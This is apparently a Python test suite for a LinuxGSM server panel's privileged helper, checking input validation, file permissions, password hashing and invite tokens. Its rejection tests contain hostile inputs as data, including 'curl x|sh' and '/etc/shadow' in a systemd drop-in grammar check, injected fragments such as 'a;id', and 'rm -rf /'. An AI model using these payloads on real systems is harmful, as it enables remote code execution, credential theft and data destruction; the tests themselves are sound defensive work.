_tricky = "a'b\"c$d`e\\f\n[DEFAULT]\nignoreip = 10.0.0.1/8\n"
import base64 as _b64t
_rc = _priv.remote_write_command("fail2ban-panel-whitelist", _tricky)
check("privileged: remote write round-trips content containing shell metacharacters",
      _b64t.b64decode(_rc.split()[1]).decode() == _tricky)
check("privileged: remote write targets the table's path, not a caller's",
      "/etc/fail2ban/jail.d/zz-panel-whitelist.local" in _rc)

# The content box shares nothing until access is granted. The shell form created serverfiles with
# `install -m 750`, so the group bits existed from the moment the directory did, whether or not any
# GMod user had been granted anything. Creation is private now and the grant is what opens it.
import getpass as _gp2
import grp as _grp2
import pwd as _pwd2
import stat as _st2
try:
    _me2 = _gp2.getuser()
    _mygrp2 = _grp2.getgrgid(_pwd2.getpwnam(_me2).pw_gid).gr_name
    _cbox = _tempfile.mkdtemp(prefix="panel-content-")
    # A fresh copy of the helper module, so redirecting its home root cannot leak into any other
    # test — _sandboxed_helper() is defined further down, after the sshd block.
    _spec_c = _ilu.spec_from_loader("ph_content",
                                    _machinery.SourceFileLoader("ph_content", _helper_path))
    _hc = _ilu.module_from_spec(_spec_c)
    _spec_c.loader.exec_module(_hc)
    _hc.HOME_ROOT = _cbox
    _hc.home_of = lambda u, _r=_cbox: _r + "/" + _hc.v_username(u)
    os.makedirs(_cbox + "/" + _me2, exist_ok=True)
    _hc.do_content_dir_create([_me2], None)
    _sf = _cbox + "/" + _me2 + "/serverfiles"
    check("content box: serverfiles is created PRIVATE, not group-readable",
          _st2.S_IMODE(os.stat(_sf).st_mode) == 0o700,
          oct(_st2.S_IMODE(os.stat(_sf).st_mode)))
    os.makedirs(_sf + "/cstrike/sub", exist_ok=True)
    open(_sf + "/cstrike/plain", "w").write("x")
    os.chmod(_sf + "/cstrike/plain", 0o600)
    _hc.do_content_grant_read([_me2, _mygrp2, _me2, "cstrike"], None)
    check("content box: the grant makes serverfiles traversable by the group",
          _st2.S_IMODE(os.stat(_sf).st_mode) & _st2.S_IXGRP,
          oct(_st2.S_IMODE(os.stat(_sf).st_mode)))
    _pm = _st2.S_IMODE(os.stat(_sf + "/cstrike/plain").st_mode)
    check("content box: g+rX gives a plain file g+r and NOT g+x",
          (_pm & _st2.S_IRGRP) and not (_pm & _st2.S_IXGRP), oct(_pm))
    _dm = _st2.S_IMODE(os.stat(_sf + "/cstrike/sub").st_mode)
    check("content box: g+rX gives a directory both bits, because it was already u+x",
          (_dm & _st2.S_IRGRP) and (_dm & _st2.S_IXGRP), oct(_dm))
    _shutil.rmtree(_cbox, ignore_errors=True)
except (KeyError, OSError) as _e:
    skip("content box: grant semantics", _e)

# content_path() is the second line of defence and the vector tests above never reach it: they go
# through check_args, whose per-verb validators reject a bad identifier first. So it is exercised
# DIRECTLY here — mutation showed that removing its validation left the whole suite green.
eq("content_path builds the expected path",
   _priv.content_path("gmodcontent", "serverfiles", "cstrike"),
   "/home/gmodcontent/serverfiles/cstrike")
check("content_path agrees between the panel and the helper",
      _priv.content_path("gmodcontent", "serverfiles", "cstrike")
      == _helper.content_path("gmodcontent", "serverfiles", "cstrike"))
for _bad in (("gmodcontent", "../../etc"), ("gmodcontent", ".."), ("gmodcontent", ""),
             ("gmodcontent", "a;b"), ("gmodcontent", "/etc"), ("..", "serverfiles"),
             ("gmodcontent", "serverfiles", "../.."), ("", "serverfiles")):
    check("content_path refuses %r" % (_bad,),
          _ufw_raises_verb(lambda b=_bad: _priv.content_path(*b)))

# The helper's own group check: content-grant-read adds a user to a GROUP, and the group named by
# the caller must actually be the content user's. Mutation showed this was untested — the suite
# exercises argv building, not the action bodies.
import getpass as _getpass
import grp as _grp
import pwd as _pwd
try:
    _me = _getpass.getuser()
    _my_group = _grp.getgrgid(_pwd.getpwnam(_me).pw_gid).gr_name
    check("content-grant-read refuses a group that is not the content user's",
          _helper.do_content_grant_read([_me, "root" if _my_group != "root" else "daemon",
                                         _me], None) == 2)
except (KeyError, OSError) as _e:
    skip("content-grant-read group check", _e)

# home_of() is the only place a path is built from a name, and it feeds an `rm -rf` running as
# root. Both copies must agree, and neither may ever produce /home itself or escape it.
eq("home_of builds the obvious path", _priv.home_of("codserver"), "/home/codserver")
check("home_of agrees between the panel and the helper",
      _priv.home_of("codserver") == _helper.home_of("codserver"))
for _bad in ("..", ".", "", "/", "../root", "x/../.."):
    check("home_of refuses %r" % _bad, _ufw_raises_verb(lambda b=_bad: _priv.home_of(b)))

# The line count is bounded at both ends: 0 is not a count, and an unbounded one would let a caller
# ask for the entire journal through a root command.
for _n in ("0", "99999", "5; id", "-1", ""):
    check("privileged: journal refuses line count %r" % _n,
          _ufw_raises_verb(lambda n=_n: _priv.check_args("journal", ["ssh", n])))
check("privileged: the panel's OS-update log path is the one the helper reads",
      _priv.OS_UPDATE_LOG == _helper.OS_UPDATE_LOG,
      "%s / %s" % (_priv.OS_UPDATE_LOG, _helper.OS_UPDATE_LOG))
# ssh_manager deliberately has NO copy of this path: the helper both writes the log and reads it
# back through the os-update-log verb, so a third alias could only ever drift. Assert its absence,
# or the next person "restoring symmetry" reintroduces the dead global this test used to check.
check("privileged: ssh_manager keeps no copy of the OS-update log path",
      not hasattr(sm, "_OS_UPDATE_LOG"))
check("privileged: the two copies agree on every log path and journal unit",
      _priv.LOG_FILES == _helper.LOG_FILES and _priv.JOURNAL_UNITS == _helper.JOURNAL_UNITS)

# `| tail -n` became Python.
eq("_last_lines keeps the tail", _sm_core._last_lines("a\nb\nc\nd", 2), "c\nd")
eq("_last_lines is fine with fewer lines than asked", _sm_core._last_lines("a", 5), "a")
eq("_last_lines handles empty output", _sm_core._last_lines("", 3), "")
eq("_last_lines handles None", _sm_core._last_lines(None, 3), "")

# ufw status parsing that used to be a `grep` running under root.
check("ufw: _ufw_is_active reads the Status line", _sm_firewall._ufw_is_active("Status: active") is True)
check("ufw: _ufw_is_active is false for inactive", _sm_firewall._ufw_is_active("Status: inactive") is False)

# ── Host CPU% comes from /proc/stat, not from a `top` process ─────────────────────────────────
# `top -bn1` was 208ms of /server-management's 272ms cold render — top sleeps to take its own
# delta. get_server_status already runs behind a 15s cache, so the PREVIOUS call is the sample
# window and the steady-state cost is zero processes: the page's recurring refresh went 272ms ->
# 19ms. The remote path (ssh_manager/_core.host_live_metrics) has always read /proc/stat this way;
# only the local one was still paying for top.
from panel.ops import system_ops as _so_cpu

# The arithmetic, against a fixed pair of samples so it cannot depend on the machine's real load.
_saved_read, _saved_sample = _so_cpu._read_cpu_jiffies, dict(_so_cpu._CPU_SAMPLE)
try:
    # 200 jiffies passed, 50 of them idle -> 75% busy.
    _so_cpu._CPU_SAMPLE["idle"], _so_cpu._CPU_SAMPLE["total"] = 1000, 2000
    _so_cpu._read_cpu_jiffies = lambda: (1050, 2200)
    eq("cpu%: a 50/200 idle share reads as 75% busy", _so_cpu._local_cpu_percent(), "75.0")

    # A fully idle window is 0%, not a negative number.
    _so_cpu._CPU_SAMPLE["idle"], _so_cpu._CPU_SAMPLE["total"] = 1000, 2000
    _so_cpu._read_cpu_jiffies = lambda: (1200, 2200)
    eq("cpu%: an entirely idle window reads as 0", _so_cpu._local_cpu_percent(), "0.0")

    # A counter that did not move yields "", which every caller already renders as "?".
    _so_cpu._CPU_SAMPLE["idle"], _so_cpu._CPU_SAMPLE["total"] = 1000, 2000
    _so_cpu._read_cpu_jiffies = lambda: (0, 0)
    eq("cpu%: an unreadable /proc/stat yields empty, not a crash", _so_cpu._local_cpu_percent(), "")
finally:
    _so_cpu._read_cpu_jiffies = _saved_read
    _so_cpu._CPU_SAMPLE.clear()
    _so_cpu._CPU_SAMPLE.update(_saved_sample)

# The regression itself: shelling out to `top` for this number is what made the page slow.
_sysops_src = open(os.path.join(_root, "panel", "ops", "system_ops.py"), encoding="utf-8").read()
# CODE lines only: the comment above _local_cpu_percent names the command it replaced, and a
# whole-file substring match flagged that explanation as the defect.
_sysops_code = [ln.split("#", 1)[0] for ln in _sysops_src.splitlines()]
check("cpu%: system_ops does not shell out to `top` for host CPU",
      not any("top -bn1" in ln for ln in _sysops_code),
      "a `top -bn1` is back — it costs ~208ms per status refresh; read /proc/stat instead")

# ── eventlet.monkey_patch() must run BEFORE the first panel/flask import ──────────────────────
# eventlet replaces the stdlib's threading primitives. Anything imported FIRST keeps the originals,
# and eventlet's attempt to upgrade the objects that already exist walks into Flask's LocalProxy
# ("Working outside of application context") and gives up partway through.
#
# tools/perf_bench.py did exactly that: it imported ssh_manager at the top and only reached
# monkey_patch later, by way of `import app`. Every run printed five patcher tracebacks and then
# carried on with threading primitives that were NOT cooperative — in the one tool whose numbers
# get used to justify a perf change. app.py has always had the order right, and the smoke suite
# boots it with zero patcher errors; nothing checked that it STAYS right, or that the next entry
# point gets it right.
import ast as _ast_mp
_HEAVY = ("panel", "flask", "flask_login", "flask_sqlalchemy", "app")
for _f in ("app.py", os.path.join("tools", "perf_bench.py")):
    _mp_src = open(os.path.join(_root, _f), encoding="utf-8").read()
    if "monkey_patch" not in _mp_src:
        continue
    _mp_tree = _ast_mp.parse(_mp_src)
    _patch_at = min((_n.lineno for _n in _ast_mp.walk(_mp_tree)
                     if isinstance(_n, _ast_mp.Call)
                     and getattr(_n.func, "attr", None) == "monkey_patch"), default=None)
    _first_heavy = None
    for _n in _ast_mp.walk(_mp_tree):
        _mod = None
        if isinstance(_n, _ast_mp.Import):
            _mod = sorted(_a.name for _a in _n.names)[0] if _n.names else None
        elif isinstance(_n, _ast_mp.ImportFrom):
            _mod = _n.module
        if _mod and _mod.split(".")[0] in _HEAVY:
            _first_heavy = _n.lineno if _first_heavy is None else min(_first_heavy, _n.lineno)
    check("%s: eventlet.monkey_patch() runs before the first panel/flask import" % _f,
          _patch_at is not None and (_first_heavy is None or _patch_at < _first_heavy),
          "monkey_patch at line %s, first panel/flask import at line %s" % (_patch_at, _first_heavy))

# ── every audited action names WHAT it acted on ───────────────────────────────────────────────
# The audit log's Target column was blank for panel-host actions (panel_self_update, server_reboot,
# the tailscale/ufw ones, ...) while the IDENTICAL action taken through remote management filled it
# in from remote.name. On the /logs page that read as "some rows just don't have a target", and it
# made those rows unsearchable — the q filter searches target, detail and username.
#
# A handful genuinely have nothing to name, and they are listed here WITH the reason rather than
# left to look like oversights. Anything else must pass target=; a new action that forgets fails
# this instead of quietly shipping another blank column.
_NO_TARGET_OK = {
    # The USER column already names the account and the detail carries the IP — a target here
    # would just repeat the user column.
    "login", "logout", "login_failed", "login_blocked",
    # Refreshes the LinuxGSM game LIST (a cache), not a host or an object. Detail is "<n> games".
    "lgsm_data_refresh",
}
import ast as _ast_log
_missing_target = []
for _dirpath, _dirnames, _filenames in os.walk(_root):
    if any(_skip in _dirpath for _skip in (".venv", "venv", "/tests", "node_modules", "/.git")):
        continue
    for _fn in _filenames:
        if not _fn.endswith(".py"):
            continue
        _fp = os.path.join(_dirpath, _fn)
        try:
            _tree = _ast_log.parse(open(_fp, encoding="utf-8").read())
        except (SyntaxError, OSError):
            continue
        for _n in _ast_log.walk(_tree):
            if not isinstance(_n, _ast_log.Call):
                continue
            if getattr(_n.func, "id", getattr(_n.func, "attr", None)) != "log_action":
                continue
            # log_action(user, action, target=..., ...) — target is the 3rd positional or a kwarg
            if "target" in {_k.arg for _k in _n.keywords if _k.arg} or len(_n.args) >= 3:
                continue
            _act = (_n.args[1].value
                    if len(_n.args) >= 2 and isinstance(_n.args[1], _ast_log.Constant) else None)
            if _act in _NO_TARGET_OK:
                continue
            _missing_target.append("%s:%d %s" % (os.path.relpath(_fp, _root), _n.lineno, _act))
check("audit: every logged action names a target (or is listed as having none)",
      not _missing_target,
      "; ".join(sorted(_missing_target)[:5]) +
      " — pass target= (LOCAL_HOST_LABEL for panel-host actions), or add it to _NO_TARGET_OK "
      "with a reason")

# ── passwords are not capped at bcrypt's 72 bytes ─────────────────────────────────────────────
# bcrypt takes at most 72 BYTES. That produced two failures, neither of them visible to the person
# hitting it: setting a longer password raised ValueError out of hash_password (uncaught -> 500,
# because password_problem has a minimum and no maximum), and anyone who set one while bcrypt 4.x
# was installed — 4.x truncated SILENTLY where 5.0 raises — is refused at login now, with their
# correct password reading as "wrong password".
#
# hash_password SHA-256s first, so bcrypt always sees 44 bytes and length stops mattering.
from panel.security import auth as _auth_pw
import bcrypt as _bcrypt_pw

_LONG_PW = "Aa1!" + "x" * 300
# Caught, not left to propagate: without the pre-hash this raises at IMPORT time and takes the
# whole suite down before it prints a tally — every other check's result goes with it, and a
# crashed run is the one shape that can be mistaken for "nothing failed". Report it instead.
try:
    _h_new = _auth_pw.hash_password(_LONG_PW)
    _h_err = None
except Exception as _e:
    _h_new, _h_err = "", "%s: %s" % (type(_e).__name__, _e)
check("password: a 300+ character password hashes without raising",
      _h_err is None and isinstance(_h_new, str) and len(_h_new) > 0, _h_err or "")
check("password: ...and verifies", _auth_pw.check_password(_LONG_PW, _h_new))
check("password: ...and a wrong one of the same length does not",
      not _auth_pw.check_password("Bb2@" + "z" * 300, _h_new))
# Two passwords sharing the first 72 bytes must NOT be interchangeable — the whole point.
check("password: two passwords with the same first 72 bytes are distinguished",
      not _auth_pw.check_password(_LONG_PW + "-different-tail", _h_new))
check("password: the stored hash still fits the String(256) column", len(_h_new) <= 256)

# Legacy rows (bare bcrypt over the raw password) must keep working, and be flagged for upgrade.
_legacy = _bcrypt_pw.hashpw(b"OldP@ssw0rd1", _bcrypt_pw.gensalt(4)).decode()
check("password: a legacy bcrypt hash still verifies",
      _auth_pw.check_password("OldP@ssw0rd1", _legacy))
check("password: a legacy hash is flagged for rehash", _auth_pw.needs_rehash(_legacy))
check("password: a new hash is not", not _auth_pw.needs_rehash(_h_new))
check("password: a wrong password against a legacy hash is still refused",
      not _auth_pw.check_password("nope", _legacy))

# The lockout: bcrypt 4.x stored the first 72 bytes, so that is what the hash is OF.
_trunc = _bcrypt_pw.hashpw(_LONG_PW.encode()[:72], _bcrypt_pw.gensalt(4)).decode()
check("password: an account stranded by the 4.x -> 5.0 upgrade can sign in again",
      _auth_pw.check_password(_LONG_PW, _trunc))
check("password: ...and that path still refuses a different long password",
      not _auth_pw.check_password("Bb2@" + "y" * 300, _trunc))
check("password: an empty or malformed stored hash returns False, never raises",
      not _auth_pw.check_password("x", "") and not _auth_pw.check_password("x", "not-a-hash"))

# ── one-time invite links ─────────────────────────────────────────────────────────────────────
# An invite is a credential-free way to onboard someone: they open it once, pick their own
# username and password, and the link dies. The properties that matter are all here, because the
# redemption route is the only one in the panel that is deliberately NOT login_required.
from panel.db.models import Invite as _Inv
from panel.core.clock import utcnow as _now_inv
from datetime import timedelta as _td_inv

_inv, _tok = _Inv.mint(None, hours=48, superadmin=False, group_ids=[3, 1, 3], note="x" * 200)
check("invite: the token is long enough to be unguessable", len(_tok) >= 40, "len=%d" % len(_tok))
check("invite: only the HASH is stored — the plaintext is not in the row",
      _tok not in (_inv.token_hash or "") and len(_inv.token_hash) == 64)
check("invite: a fresh one is usable", _inv.is_usable)
check("invite: duplicate group ids are collapsed and sorted", _inv.groups_wanted == [1, 3],
      str(_inv.groups_wanted))
check("invite: the note is bounded to the column", len(_inv.note) <= 120)

# Used and expired must BOTH close it — one without the other leaves a reusable or immortal link.
_used, _ = _Inv.mint(None)
_used.used_at = _now_inv()
check("invite: a used one is not usable", not _used.is_usable)
_old, _ = _Inv.mint(None)
_old.expires_at = _now_inv() - _td_inv(hours=1)
check("invite: an expired one is not usable", not _old.is_usable)

# A malformed group list must not 500 the redemption page.
_bad, _ = _Inv.mint(None)
for _garbage in ("", "not json", "null", '{"not": "a list"}', "[1, null, \"two\"]"):
    _bad.group_ids = _garbage
    try:
        _got = _bad.groups_wanted
        _ok = isinstance(_got, list)
    except Exception:
        _ok = False
    check("invite: a malformed group list is ignored, not fatal (%r)" % _garbage[:14], _ok)

# Revocation. An invite could be minted but not taken back, so a link sent to the wrong address
# could only be waited out — and the TTL goes to 30 days. revoked_at is its OWN timestamp rather
# than a reuse of used_at, because "somebody redeemed this" and "the sender took it back" are
# different facts and the list must not confuse them.
_rev, _ = _Inv.mint(None)
check("invite: a fresh one reads as active", _rev.state == "active", _rev.state)
_rev.revoked_at = _now_inv()
check("invite: a revoked one is not usable", not _rev.is_usable)
check("invite: ...and reads as revoked, not used", _rev.state == "revoked", _rev.state)

_redeemed, _ = _Inv.mint(None)
_redeemed.used_at = _now_inv()
check("invite: a redeemed one reads as used", _redeemed.state == "used", _redeemed.state)
# Order matters: redeemed-then-expired is still "used" — what happened to it is the fact that
# matters, not the clock.
_redeemed.expires_at = _now_inv() - _td_inv(hours=1)
check("invite: redeemed AND expired still reads as used", _redeemed.state == "used", _redeemed.state)

_gone, _ = _Inv.mint(None)
_gone.expires_at = _now_inv() - _td_inv(hours=1)
check("invite: an expired one reads as expired", _gone.state == "expired", _gone.state)

# An invite must not outlive the AUTHORITY behind it. Found in a security review of this same
# feature: an admin who is offboarded — demoted, deactivated, deleted — left live invites behind
# for up to the 30-day maximum TTL, and whoever held one still got the account they promised,
# superadmin included. is_usable only knows about the invite's own lifecycle, so the creator check
# is separate and the route applies both.
class _FakeUser:
    def __init__(self, sa=True, active=True):
        self.is_superadmin, self.is_active = sa, active

_sa_inv, _ = _Inv.mint(None, superadmin=True)
_sa_inv.created_by_id = 42          # mint(None) leaves it NULL; a real one always has a creator
check("invite: a superadmin-granting invite is fine while its creator is an active superadmin",
      _sa_inv.authority_intact(_FakeUser(sa=True, active=True)))
check("invite: ...dies when the creator is DEMOTED",
      not _sa_inv.authority_intact(_FakeUser(sa=False, active=True)))
check("invite: ...dies when the creator is DEACTIVATED",
      not _sa_inv.authority_intact(_FakeUser(sa=True, active=False)))
check("invite: ...dies when the creator's account is GONE",
      not _sa_inv.authority_intact(None))

_plain, _ = _Inv.mint(None, superadmin=False, group_ids=[1])
_plain.created_by_id = 42
check("invite: a plain invite survives its creator being demoted (it grants no rank)",
      _plain.authority_intact(_FakeUser(sa=False, active=True)))
check("invite: ...but not the creator being deactivated",
      not _plain.authority_intact(_FakeUser(sa=False, active=False)))

_orphan, _ = _Inv.mint(None)        # created_by_id stays NULL
check("invite: one with no creator recorded has no authority to have lapsed",
      _orphan.authority_intact(None))

# Two invites must never collide, and the hash must be a pure function of the token.
_a, _ta = _Inv.mint(None)
_b, _tb = _Inv.mint(None)
check("invite: two invites get different tokens and hashes",
      _ta != _tb and _a.token_hash != _b.token_hash)
import hashlib as _hl_inv
check("invite: the stored hash is sha256 of the token",
      _a.token_hash == _hl_inv.sha256(_ta.encode()).hexdigest())



# ── the helper reads stdin ONLY for the verbs that consume it ───────────────────────────────────
# `main()` used to do `action(checked, sys.stdin.read())` for every ACTIONS verb. 26 of the 28 take
# that parameter and ignore it, and read() on an inherited descriptor blocks until EOF — so on a
# panel whose fd 0 was a pipe or a tty rather than /dev/null, those 26 verbs hung for the caller's
# entire timeout and came back "Command timed out". Under systemd fd 0 IS /dev/null, which is why
# it never showed in the live deployment; it showed the moment the GMod content flow was driven by
# hand on the test host, where `content-dir-create` sat for 30s and ensure_content_user gave up.
#
# The set is derived from the source here rather than written out, so a new verb that reads stdin
# without being added to STDIN_VERBS fails this instead of silently receiving "".
import ast as _ast

_h_src = open(_helper_path).read()
_h_tree = _ast.parse(_h_src)
_h_funcs = {n.name: n for n in _ast.walk(_h_tree) if isinstance(n, _ast.FunctionDef)}


def _payload_is_used(fn_name):
    """Whether that action's body actually references its stdin parameter (docstring excluded)."""
    f = _h_funcs[fn_name]
    param = f.args.args[1].arg
    body = f.body[1:] if (f.body and isinstance(f.body[0], _ast.Expr)
                          and isinstance(f.body[0].value, _ast.Constant)) else f.body
    return any(isinstance(x, _ast.Name) and x.id == param
               for b in body for x in _ast.walk(b))


# ACTIONS maps verb -> function object; recover the NAME from the module's own globals.
_h_name_of = {v: k for k, v in vars(_helper).items() if callable(v)}
_h_consumers = {verb for verb, fn in _helper.ACTIONS.items()
                if _payload_is_used(_h_name_of[fn])}
check("helper: STDIN_VERBS is exactly the set of actions that use their payload",
      _helper.STDIN_VERBS == _h_consumers,
      "declared=%s derived=%s" % (sorted(_helper.STDIN_VERBS), sorted(_h_consumers)))
check("helper: ...and that is a strict subset of ACTIONS (most verbs want no stdin)",
      _h_consumers < set(_helper.ACTIONS) and len(_h_consumers) < len(_helper.ACTIONS),
      "%d of %d" % (len(_h_consumers), len(_helper.ACTIONS)))
# The positive control: without one, an empty ACTIONS (or a broken parse) passes both lines above.
check("helper: ...and the derivation actually read the verb table",
      len(_helper.ACTIONS) >= 20 and "write-file" in _h_consumers,
      "%d actions" % len(_helper.ACTIONS))


# ── the ssh.socket drop-in's content grammar ───────────────────────────────────────────────────
# Every other WRITE_TARGETS destination is a config file whose directives only CONFIGURE. A systemd
# unit file is not: ExecStartPre= runs a command as root the moment the unit starts, and this unit
# is restarted by the very verb that writes the file. So an unconstrained write here would be
# arbitrary root execution reachable from the panel — a strictly worse primitive than the sshd_config
# drop-in whose grammar this sits beside.
_sock_rule = _helper.WRITE_CONTENT["sshd-socket-dropin"]
check("ssh.socket: the drop-in has a content rule at all (no rule = the write is refused anyway)",
      _sock_rule is not None)
check("ssh.socket: the body the panel actually sends is accepted",
      _helper._lines_match("[Socket]\nListenStream=\n"
                           "ListenStream=0.0.0.0:2222\nListenStream=[::]:2222\n", _sock_rule))
check("ssh.socket: ...including a bind address and an IPv6 literal",
      _helper._lines_match("[Socket]\nListenStream=\nListenStream=10.0.0.5:22\n", _sock_rule)
      and _helper._lines_match("[Socket]\nListenStream=\nListenStream=[fd00::1]:22\n", _sock_rule))
# Each of these is root execution, a privilege change, or a way to pull in another file.
for _evil in ("ExecStartPre=/bin/sh -c id",
              "ExecStartPost=-/bin/sh -c 'curl x|sh'",
              "ExecStart=/bin/sh",
              "User=root",
              "EnvironmentFile=/etc/shadow",
              "Also=evil.service",
              "ListenStream=/run/evil.sock",
              "Accept=yes",
              "[Service]",
              "ListenStream=0.0.0.0:22\nExecStartPre=/bin/sh"):
    check("ssh.socket: grammar refuses %r" % _evil.replace("\n", " ⏎ ")[:44],
          not _helper._lines_match(_evil, _sock_rule))
# A comment and a blank line are skipped by _lines_match, so the panel's own header must not be a
# way past the grammar: a directive is a directive whether or not comments surround it.
check("ssh.socket: ...and a comment header does not smuggle a directive past it",
      not _helper._lines_match("# Managed by LinuxGSM Panel\n\nExecStart=/bin/sh\n", _sock_rule))


# ── `lgsm-command`: the verb that put server control back on a narrow-grant host ───────────────
# run_as_game_user built `sudo -u <user> bash -c '<inner>'` and passed sudo=False. The narrow
# sudoers grant install.sh writes permits the helper and NOTHING else, so on the install it calls
# hardened the panel could not run a single LinuxGSM command — while /api/servers kept reporting
# those servers "online", because it port-scans instead of asking LinuxGSM. Proven on a test host:
# `sudo -n -u gmodserver id` -> "sudo: a password is required", a restart left the pid unchanged.
from app import RUNNABLE_ACTIONS as _RA                                            # noqa: E402

check("lgsm-command: the helper and the panel agree on the action list",
      tuple(_helper.LGSM_ACTIONS) == tuple(_priv.LGSM_ACTIONS),
      "helper=%s panel=%s" % (_helper.LGSM_ACTIONS, _priv.LGSM_ACTIONS))
# The third list. An action the panel offers but the verb will not run is a button that fails only
# on a hardened host — precisely the shape of the bug this verb exists to fix.
check("lgsm-command: every action the panel offers is one the verb will run",
      set(_RA) <= set(_priv.LGSM_ACTIONS),
      "panel-only=%s" % sorted(set(_RA) - set(_priv.LGSM_ACTIONS)))
check("lgsm-command: ...and the two mods subcommands files.py drives are in it too",
      {"mods-install", "mods-remove"} <= set(_priv.LGSM_ACTIONS))

# What the table refuses. Each of these reached a root-adjacent shell before the verb existed.
for _bad, _why in (
    (["root", "gmodserver", "details", "-", "no"], "a uid-0 account"),
    (["gmodserver", "gmodserver", "rm", "-", "no"], "an action that is not on the list"),
    (["gmodserver", "gmodserver", "details 2>&1", "-", "no"], "a shell fragment as the action"),
    (["gmodserver", "gmodserver", "details", "a;id", "no"], "a shell metacharacter in an answer"),
    (["gmodserver", "gmodserver", "details", "-", "sometimes"], "a tee flag that is not yes/no"),
):
    _refused = False
    try:
        _priv.check_args("lgsm-command", _bad)
    except Exception:
        _refused = True
    check("lgsm-command: refuses %s" % _why, _refused, "ACCEPTED %r" % (_bad,))
check("lgsm-command: ...and still accepts the real thing",
      _priv.check_args("lgsm-command", ["gmodserver", "gmodserver", "mods-install", "sourcemod,Y",
                                        "no"])[3] == "sourcemod,Y")

# ── ...and run_as_game_user actually TAKES the verb on a local host ────────────────────────────
# The gate that matters: covering the verb is not covering the call site that chooses it. Without
# this, the whole fix could be present and never reached.
_ragu_argv, _ragu_shell = [], []
_o_local, _o_hp = _sm_core.is_local_server, _sm_core.helper_present
_o_exec, _o_rc = _sm_core._exec_local_argv, _sm_core.run_command
try:
    _sm_core.is_local_server = lambda s: True
    _sm_core.helper_present = lambda: True
    _sm_core._exec_local_argv = lambda argv, **k: (_ragu_argv.append(argv), ("out", "", 0))[1]
    _sm_core.run_command = lambda s, c, **k: (_ragu_shell.append(c), ("", "", 0))[1]

    _sm_core.run_as_game_user(NS(), "gmodserver", "restart", selfname="gmodserver")
    check("run_as_game_user: a LOCAL host with the helper runs the verb, not a shell",
          len(_ragu_argv) == 1 and not _ragu_shell, "argv=%s shell=%s" % (_ragu_argv, _ragu_shell))
    check("run_as_game_user: ...and it is the lgsm-command verb with the action as one word",
          _ragu_argv and _ragu_argv[0][-4:] == ["gmodserver", "restart", "-", "no"],
          str(_ragu_argv))
    check("run_as_game_user: ...and no element of that argv contains a shell metacharacter",
          _ragu_argv and not any(ch in el for el in _ragu_argv[0] for ch in ";|&$`<>"),
          str(_ragu_argv))

    # The refusal has to bite BEFORE the transport, or a bad value reaches one of them.
    _ragu_argv.clear(); _ragu_shell.clear()
    _o, _e, _r = _sm_core.run_as_game_user(NS(), "gmodserver", "details 2>&1")
    check("run_as_game_user: a shell fragment is refused, not quoted and run",
          _r == 1 and not _ragu_argv and not _ragu_shell, "rc=%s sent=%s" % (_r, _ragu_argv))

    # ── the REMOTE rendering, which is the pre-helper form and must stay correct ──
    _sm_core.is_local_server = lambda s: False
    _ragu_shell.clear()
    _sm_core.run_as_game_user(NS(), "gmodserver", "mods-install", answers=["sourcemod", "Y"])
    _cmd = _ragu_shell[0] if _ragu_shell else ""
    check("run_as_game_user: a REMOTE host still gets the sudo -u shell form", "sudo -u" in _cmd)
    check("run_as_game_user: ...with the answers as printf ARGUMENTS, not a here-string",
          "printf" in _cmd and "<<<" not in _cmd, _cmd[:160])
    # The bug a naive port makes: `TERM=xterm printf … | ./gmodserver …` sets TERM for PRINTF and
    # leaves LinuxGSM emitting `tput: unknown terminal "unknown"` over every line of output.
    check("run_as_game_user: ...and TERM is EXPORTED, so it survives into the pipeline",
          "export TERM=xterm" in _cmd, _cmd[:160])
    _ragu_shell.clear()
    _sm_core.run_as_game_user(NS(), "gmodserver", "update", tee_log=True)
    _cmd = _ragu_shell[0] if _ragu_shell else ""
    check("run_as_game_user: tee_log writes where _action_log_path says the console will tail",
          "/home/gmodserver/.panel-update.log" in _cmd, _cmd[:200])
    check("run_as_game_user: ...and keeps LinuxGSM's exit code rather than cat's",
          "rc=$?" in _cmd and "exit $rc" in _cmd, _cmd[:200])
finally:
    _sm_core.is_local_server, _sm_core.helper_present = _o_local, _o_hp
    _sm_core._exec_local_argv, _sm_core.run_command = _o_exec, _o_rc

# The helper derives the tee path itself rather than accepting one; both sides must land on the
# same file or the console tails something the action never writes.
from panel.routes._shared import _action_log_path as _alp                          # noqa: E402
check("lgsm-command: the helper's log path and the panel's _action_log_path agree",
      _helper._lgsm_log_path("/home/gmodserver", "update") == _alp("gmodserver", "update"),
      "%s vs %s" % (_helper._lgsm_log_path("/home/gmodserver", "update"),
                    _alp("gmodserver", "update")))

# The contract is a TUPLE, never a raise — several callers run in a background thread whose only
# report back to the user is that rc, so an escaping exception reached them as silence. Found by
# mutation: with the validation call removed, the suite did not fail, it DIED, and a harness that
# counted "FAIL" lines read a dead suite as a clean one.
_o_local2, _o_hp2 = _sm_core.is_local_server, _sm_core.helper_present
try:
    _sm_core.is_local_server = lambda s: True
    _sm_core.helper_present = lambda: True
    for _bad_user, _bad_act in (("root", "details"), ("gmodserver", "rm -rf /"), ("", "details")):
        _raised = None
        try:
            _r = _sm_core.run_as_game_user(NS(), _bad_user, _bad_act)
        except Exception as _e:
            _raised = _e
        check("run_as_game_user: (%r, %r) returns a tuple rather than raising"
              % (_bad_user, _bad_act),
              _raised is None and isinstance(_r, tuple) and len(_r) == 3 and _r[2] != 0,
              "raised=%r result=%r" % (_raised, _raised is None and _r or None))
finally:
    _sm_core.is_local_server, _sm_core.helper_present = _o_local2, _o_hp2

# The claim in run_as_game_user is that BOTH transports are held to the same table. Only the local
# one re-validates on its own (helper_argv checks again), so deleting the shared check_args call
# left every check passing while the remote rendering quietly accepted anything quotable. Found by
# mutation: the mutant survived 2127 green checks.
_o_local3, _o_rc3 = _sm_core.is_local_server, _sm_core.run_command
_rem_sent = []
try:
    _sm_core.is_local_server = lambda s: False
    _sm_core.run_command = lambda s, c, **k: (_rem_sent.append(c), ("", "", 0))[1]
    for _bad_act, _bad_ans, _why in (
        ("details 2>&1", None, "a shell fragment as the action"),
        ("rm", None, "an action that is not on the list"),
        ("details", ["a;id"], "a shell metacharacter in an answer"),
    ):
        _rem_sent.clear()
        _o2, _e2, _r2 = _sm_core.run_as_game_user(NS(), "gmodserver", _bad_act, answers=_bad_ans)
        check("run_as_game_user: the REMOTE path refuses %s too" % _why,
              _r2 == 1 and not _rem_sent, "rc=%s sent=%s" % (_r2, _rem_sent))
finally:
    _sm_core.is_local_server, _sm_core.run_command = _o_local3, _o_rc3


# ── gameuser-group: the account the panel creates must land inside the grant ───────────────────
